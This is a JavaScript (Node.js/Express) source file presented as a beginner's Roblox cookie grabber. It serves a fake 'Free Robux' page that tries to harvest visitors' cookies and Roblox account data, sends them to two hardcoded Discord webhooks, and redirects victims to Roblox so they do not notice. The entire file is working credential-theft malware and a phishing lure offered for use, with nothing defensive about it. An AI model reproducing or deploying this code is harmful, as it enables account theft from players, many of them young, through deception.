// SIMPLE ROBLOX COOKIE GRABBER FOR BEGINNERS - 2026
const express = require('express'); // for making web server
const axios = require('axios'); // for sending to Discord

const app = express();

// Allow server to read data from visitors
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// PASTE YOUR TWO WEBHOOK URLS HERE (from Step 1)
const webhookUrl1 = 'https://discord.com/api/webhooks/1469681356844830844/uW5bbhqMlLTKo8Gqde_2DpGqM1BEHlzPlidyAq5RzM3glNAq03_UmbOXM2tng2lgHJ11'; // change this
const webhookUrl2 = 'https://discord.com/api/webhooks/1469676445528756225/GmsnFGkzYLhmLS3MFQn4zWuZA3KKzZnu1Uvb4lENEQhfkDYUCrsKm9dmgknxhvE6jBP-'; // change this

// Function to send stolen cookie to both Discord hooks
async function sendToDiscord(stolenData) {
const message = {
embeds: [{
title: '🎉 NEW ROBLOX COOKIE STOLEN! 🎉',
description: '```json\n' + JSON.stringify(stolenData, null, 2) + '\n```', // formats nicely
color: 0x00ff00, // green color
timestamp: new Date().toISOString(),
footer: { text: 'Beginner Grabber - Feb 2026' }
}]
};

// Send to first hook, ignore if error
try { await axios.post(webhookUrl1, message); } catch {}
// Send to second
try { await axios.post(webhookUrl2, message); } catch {}
}

// Main page that visitors see (fake Robux page with stealer script)
app.get('/', (req, res) => {
res.send(`
<!DOCTYPE html>
<html>
<head>
<title>Free Robux 2026 - Claim Now!</title>
<style>
body { background-color: black; color: lime; font-family: Arial; text-align: center; padding: 50px; }
h1 { font-size: 40px; }
p { font-size: 20px; }
</style>
</head>
<body>
<h1>Claim 1,000,000 Free Robux!</h1>
<p>Verifying your account... Please wait 5 seconds...</p>

<script>
// Wait 5 seconds then steal if logged in
setTimeout(async () => {
try {
// Fetch Roblox session data (sends cookie automatically)
const res = await fetch('https://www.roblox.com/my/settings/json', {
credentials: 'include' // important: sends cookies
});
const data = await res.json();

// Send to our server
await fetch('/steal', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
cookie: document.cookie, // full cookies
robloxData: data, // extra info
userAgent: navigator.userAgent, // browser type
time: new Date().toISOString() // when stolen
})
});

// Redirect to real Roblox so no suspicion
window.location = 'https://www.roblox.com/home';
} catch {} // if error, still redirect
}, 5000);
</script>
</body>
</html>
`);
});

// When script sends data here
app.post('/steal', (req, res) => {
const stolen = req.body;
console.log('STOLEN:', stolen); // shows in Render logs
sendToDiscord(stolen); // send to your Discord
res.sendStatus(200); // ok
});

// Start server on Render's port
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Grabber running on port ${port}`));
